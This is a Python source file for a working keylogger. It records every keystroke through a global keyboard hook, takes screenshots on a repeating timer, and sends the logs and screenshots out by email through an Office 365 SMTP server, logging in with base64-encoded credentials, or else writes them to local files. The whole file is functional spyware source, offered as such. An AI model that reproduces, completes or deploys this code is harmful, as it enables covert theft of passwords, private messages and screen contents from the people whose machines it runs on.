import base64
import os
import smtplib
import threading
from datetime import datetime
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from threading import Timer

import keyboard

from env_utils import setup_env
from file_utils import (report_to_file, take_screenshot, update_png_filename,
                        update_txt_filename)


class Keylogger:

    def set_interval(self, func, sec):

        def func_wrapper():
            self.set_interval(func, sec)
            func(self)

        t = threading.Timer(sec, func_wrapper)
        t.start()

    def base64_decode(self, base64_encoded):
        if base64_encoded is None:
            return ''
        data = base64.b64decode("{}".format(base64_encoded)).decode(
            self.encode)
        return data

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def report(self):
        if self.log or len(self.files) > 10:
            self.end_dt = datetime.now()
            update_txt_filename(self)
            if self.report_method == "email":
                email = self.base64_decode(self.email)
                passwd = self.base64_decode(self.passwd)
                self.sendmail(email, passwd, self.log)
            elif self.report_method == "file":
                report_to_file(self)
            print(f"[{self.txt_filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.send_report_every, function=self.report)
        timer.daemon = True
        timer.start()

    def prepare_mail(self, message):
        msg = MIMEMultipart("alternative")
        msg["From"] = self.base64_decode(self.email)
        msg["To"] = self.base64_decode(self.email)
        msg["Subject"] = "Keylogger logs"
        html = f"<p>{message}</p>"
        text_part = MIMEText(message, "plain")
        html_part = MIMEText(html, "html")
        msg.attach(text_part)
        msg.attach(html_part)
        for file in self.files or []:
            with open(file, "rb") as fil:
                part = MIMEApplication(fil.read(), Name=file)
            part['Content-Disposition'] = 'attachment; filename="%s"' % file
            msg.attach(part)
        return msg.as_string()

    def sendmail(self, email, password, message, verbose=1):
        server = smtplib.SMTP(host="smtp.office365.com", port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, self.prepare_mail(message))
        server.quit()
        if verbose:
            print(
                f"{datetime.now()} - Sent an email to {email} containing:  {message}"
            )
        self.files = []

    def start(self):
        self.set_interval(take_screenshot, self.screenshot_interval)
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        print(f"{datetime.now()} - Started agent")
        keyboard.wait()

    def __init__(self, report_method="email"):
        setup_env(self)
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        self.files = []

    def mkdir(self, folder):
        if not os.path.exists(folder):
            os.makedirs(folder)


if __name__ == "__main__":
    keylogger = Keylogger(report_method="file")
    keylogger.start()
